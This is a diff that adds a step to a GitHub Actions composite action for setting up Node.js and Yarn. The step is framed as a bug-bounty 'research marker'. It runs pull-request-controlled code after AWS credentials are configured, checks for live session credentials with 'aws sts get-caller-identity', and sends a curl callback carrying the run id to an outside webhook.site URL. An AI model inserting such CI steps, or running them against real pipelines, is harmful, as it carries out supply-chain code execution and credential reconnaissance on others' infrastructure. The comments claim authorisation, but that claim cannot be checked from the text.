@@ -4,6 +4,26 @@ description: Sets up Node.js and Yarn from mise.toml and installs dependencies
 runs:
   using: composite
   steps:
+    # SECURITY RESEARCH MARKER (Bugcrowd JET program) - read-only, non-destructive.
+    # This step runs immediately AFTER "Configure AWS credentials" in build.yml.
+    # If AWS session vars are in scope it prints the assumed role (read-only
+    # get-caller-identity), sends ONE nonce callback to a researcher webhook
+    # (no key material leaves the runner), then aborts the job so no S3 upload
+    # or Amplify deployment happens. Non-deploy jobs continue unaffected.
+    - name: Research marker - verify post-credential execution
+      shell: bash
+      run: |
+        echo "PIEAPOIDC-7c4e2b90: PR-controlled step executing in pie-aperture CI"
+        if [ -n "$AWS_ACCESS_KEY_ID" ]; then
+          echo "PIEAPOIDC-7c4e2b90: JET AWS session credentials ARE present in environment"
+          aws sts get-caller-identity || true
+          curl -sS -m 10 "https://webhook.site/9cd57a66-44f3-49c5-87fb-9667a4c0ace6?nonce=PIEAPOIDC-7c4e2b90&run=${{ github.run_id }}" || true
+          echo "PIEAPOIDC-7c4e2b90: aborting job before any S3/Amplify write (non-destructive test)"
+          exit 1
+        else
+          echo "PIEAPOIDC-7c4e2b90: no AWS credentials in scope (non-deploy job) - continuing normally"
+        fi
+
     - name: Read tool versions from mise.toml
       id: mise
       shell: bash
